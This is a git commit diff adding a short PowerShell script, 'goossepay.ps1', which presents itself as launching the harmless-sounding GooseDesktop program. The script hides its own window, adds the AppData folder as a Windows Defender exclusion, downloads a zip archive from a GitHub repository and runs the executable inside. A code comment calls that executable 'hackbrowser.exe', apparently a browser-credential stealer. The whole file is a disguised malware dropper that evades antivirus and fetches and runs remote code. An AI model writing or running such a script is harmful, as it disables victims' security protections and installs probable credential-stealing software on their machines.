37263319ef3f86f77effc25aa3f440b76831bed5
isppilslowispp <146780751+isppilslowispp@users.noreply.github.com>
2024-03-09 23:16:45 -0300

    Add files via upload

---
+++ goossepay.ps1
@@ -0,0 +1,17 @@
+$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
+add-type -name win -member $t -namespace native
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) 
+#Adding windows defender exclusionpath
+Add-MpPreference -ExclusionPath "$env:appdata"
+#Creating the directory we will work on
+mkdir "$env:appdata\goose"
+Set-Location "$env:appdata\goose"
+#Downloading and executing hackbrowser.exe
+Invoke-WebRequest -Uri "https://github.com/isppilslowispp/Aslclripysa/raw/main/sab.zip" -OutFile "$env:appdata\goose\sab.zip"
+cd $env:appdata\goose
+Expand-Archive sab.zip
+cd $env:appdata\goose\sab\sab
+./GooseDesktop.exe
+
+
+
